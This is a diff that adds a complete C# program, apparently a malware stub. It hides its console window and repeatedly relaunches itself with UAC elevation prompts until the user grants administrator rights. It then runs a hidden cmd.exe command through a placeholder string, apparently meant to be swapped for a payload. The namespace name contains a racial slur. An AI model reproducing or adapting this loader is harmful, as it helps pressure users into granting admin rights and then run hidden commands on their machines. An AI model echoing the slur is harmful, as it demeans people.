@@ -1,0 +1,101 @@
+using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.Linq;
+using System.Runtime.InteropServices;
+using System.Security.Principal;
+using System.Text;
+using System.Threading;
+using System.Windows.Forms;
+
+namespace AdminOrNegro
+{
+    class Program
+    {
+        static void ExecuteCommandAsAdmin(string command)
+        {
+            System.Diagnostics.Process process = new System.Diagnostics.Process();
+            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
+            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+            startInfo.FileName = "cmd.exe";
+            startInfo.Arguments = "/C " + command;
+            startInfo.Verb = "runas";
+            process.StartInfo = startInfo;
+            process.Start();
+
+        }
+
+
+        [DllImport("Kernel32.dll")]
+        private static extern IntPtr GetConsoleWindow();
+        [DllImport("User32.dll")]
+        private static extern bool ShowWindow(IntPtr hwnd, int cmdShow);
+
+
+        static void Main(string[] args)
+        {
+            IntPtr hwnd = GetConsoleWindow();
+            ShowWindow(hwnd, 0);
+
+            bool x = true;
+            while (x)
+            {
+                if (!IsRunAsAdmin())
+                {
+                    Elevate();
+                }
+                else
+                {
+                    try
+                    {
+
+                        
+                        Console.WriteLine("Process run en admin");
+                        
+                        x = false;
+                        ExecuteCommandAsAdmin(@"$[.**.]$");
+                        Process.GetCurrentProcess().Close();
+                        Thread.Sleep(-1);
+                    }
+                    catch (Exception e)
+                    {
+
+                    }
+                }
+
+            }
+            Console.ReadKey();
+        }
+
+
+
+        internal static bool IsRunAsAdmin()
+        {
+            var Principle = new WindowsPrincipal(WindowsIdentity.GetCurrent());
+            return Principle.IsInRole(WindowsBuiltInRole.Administrator);
+        }
+
+        private static bool Elevate()
+        {
+            var SelfProc = new ProcessStartInfo
+            {
+                UseShellExecute = true,
+                WorkingDirectory = Environment.CurrentDirectory,
+                FileName = Application.ExecutablePath,
+                Verb = "runas"
+            };
+            try
+            {
+                Process.Start(SelfProc);
+                Thread.Sleep(-1);
+                return true;
+            }
+            catch
+            {
+                Console.WriteLine("Error");
+                return false;
+            }
+        }
+
+    }
+}
